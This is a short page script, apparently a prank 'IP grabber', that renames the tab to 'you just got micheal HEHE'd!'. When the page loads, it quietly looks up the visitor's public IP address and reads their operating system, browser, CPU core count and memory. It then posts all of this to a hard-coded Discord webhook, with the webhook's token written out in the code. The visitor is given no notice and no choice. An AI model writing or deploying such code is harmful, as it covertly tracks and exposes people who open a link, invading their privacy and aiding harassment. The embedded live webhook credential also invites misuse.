<script>
async function loadInfo() {
    // Change name
    document.title = "you just got micheal HEHE'd!";
    // Get IP
    try {
        const response = await fetch("https://api.ipify.org?format=json");
        const data = await response.json();
        document.getElementById("ip").textContent = data.ip;
    } catch {
        document.getElementById("ip").textContent = "Unavailable";
    }

    // Detect OS
    const ua = navigator.userAgent;
    let os = "Unknown";

    if (ua.includes("Windows")) os = "Windows";
    else if (ua.includes("Mac")) os = "macOS";
    else if (ua.includes("Linux")) os = "Linux";
    else if (ua.includes("Android")) os = "Android";
    else if (ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";

    document.getElementById("os").textContent = os;

    // Browser
    document.getElementById("browser").textContent =
        navigator.userAgentData?.brands?.map(b => b.brand).join(", ")
        || navigator.userAgent;

    // CPU Cores
    document.getElementById("cores").textContent =
        navigator.hardwareConcurrency || "Unknown";

    // RAM
    document.getElementById("ram").textContent =
        navigator.deviceMemory
            ? navigator.deviceMemory + " GB"
            : "Unavailable";

    // Send data to server
    const webhookURL = "https://discord.com/api/webhooks/1517010283506303099/X6HCHoNcNfHlDO_OlO1GGZqB205OBO--qFfbkSz8lu7aEmmRDEMRBrHhjDw85bSlx_ZP";
    const payload = {
        content: `**New Submission!**\nIP: ${document.getElementById("ip").textContent}\n OS: ${document.getElementById("os").textContent}\n Browser: ${document.getElementById("browser").textContent}\n Cores: ${document.getElementById("cores").textContent}\n RAM: ${document.getElementById("ram").textContent}`
    };
    fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
    })
}

loadInfo();
</script>
